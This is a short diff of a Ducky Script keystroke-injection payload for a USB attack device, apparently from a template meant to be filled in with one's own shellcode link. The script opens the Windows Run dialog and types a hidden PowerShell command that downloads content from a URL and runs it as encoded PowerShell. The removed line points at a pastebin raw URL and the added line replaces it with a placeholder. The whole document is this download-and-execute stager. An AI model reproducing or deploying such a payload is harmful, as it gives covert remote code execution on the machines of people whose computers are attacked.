@@ -4,7 +4,7 @@ REM For how to create a link to your personal shellcode
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -windowstyle hidden $u='pastebin.com/raw/kGj3TRzV';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content
+STRING powershell -windowstyle hidden $u='YOURLINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content
 ENTER
 GUI r
 DELAY 1000
